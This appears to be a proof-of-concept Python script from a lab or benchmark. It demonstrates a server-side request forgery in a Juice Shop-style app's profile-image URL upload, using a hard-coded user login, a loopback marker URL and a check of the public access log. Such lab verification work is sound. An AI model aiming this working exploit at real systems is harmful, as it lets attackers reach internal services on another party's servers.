"""Server-Side Request Forgery in routes/profileImageUrlUpload.ts:24 (CWE-918).

The handler does `await fetch(req.body.imageUrl)` with no allowlist or scheme/host
check, so the server issues an HTTP request to any URL the client names. imageUrl
is a multipart form field (the route is mounted with multer single('file')).

Proof: the client makes the server fetch http://127.0.0.1:3000/rest/<marker> — an
internal loopback URL the client never requests itself. The server's own request
is recorded in the morgan access log (served at /support/logs) with source
::ffff:127.0.0.1 and User-Agent "node". Its presence proves the forged request.
"""

import http.client
import json
import re
import time
import urllib.request
import uuid

USER = {"email": "jim@juice-sh.op", "password": "ncc-1701"}


def _get_text(url: str) -> str:
    # serve-index / the log route can close the stream early (chunked), so a
    # short read is fine: use whatever bytes arrived.
    try:
        return urllib.request.urlopen(url).read().decode("utf-8", "replace")
    except http.client.IncompleteRead as err:
        return err.partial.decode("utf-8", "replace")


def _multipart(fields: dict[str, str]) -> tuple[bytes, str]:
    boundary = "----tfm" + uuid.uuid4().hex
    body = b""
    for key, value in fields.items():
        body += (f"--{boundary}\r\n"
                 f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
                 f"{value}\r\n").encode()
    body += f"--{boundary}--\r\n".encode()
    return body, f"multipart/form-data; boundary={boundary}"


def exploit(base: str) -> tuple[bool, str]:
    login = urllib.request.Request(f"{base}/rest/user/login", data=json.dumps(USER).encode(),
                                   headers={"content-type": "application/json"})
    with urllib.request.urlopen(login) as res:
        token = json.load(res)["authentication"]["token"]
    # whoami runs the updateAuthenticatedUsers middleware, registering the token
    # so profileImageUrlUpload's authenticatedUsers.get(token) succeeds.
    urllib.request.urlopen(urllib.request.Request(f"{base}/rest/user/whoami",
                                                  headers={"Cookie": f"token={token}"}))

    marker = f"/rest/tfm-ssrf-{uuid.uuid4().hex[:12]}"
    body, ctype = _multipart({"imageUrl": f"http://127.0.0.1:3000{marker}"})
    upload = urllib.request.Request(f"{base}/profile/image/url", data=body,
                                    headers={"content-type": ctype, "Cookie": f"token={token}"})
    urllib.request.urlopen(upload)
    time.sleep(2)

    listing = _get_text(f"{base}/support/logs/")
    logfile = re.search(r'href="(access\.log[^"]*)"', listing)
    if not logfile:
        return False, "could not locate access log"
    log = _get_text(f"{base}/support/logs/{logfile.group(1)}")

    # server-originated line: loopback source, our marker path, UA "node".
    forged = [ln for ln in log.splitlines()
              if marker in ln and "::ffff:127.0.0.1" in ln and '"node"' in ln]
    ok = bool(forged)
    return ok, f"server-side fetch of {marker} recorded in access.log: {ok}"
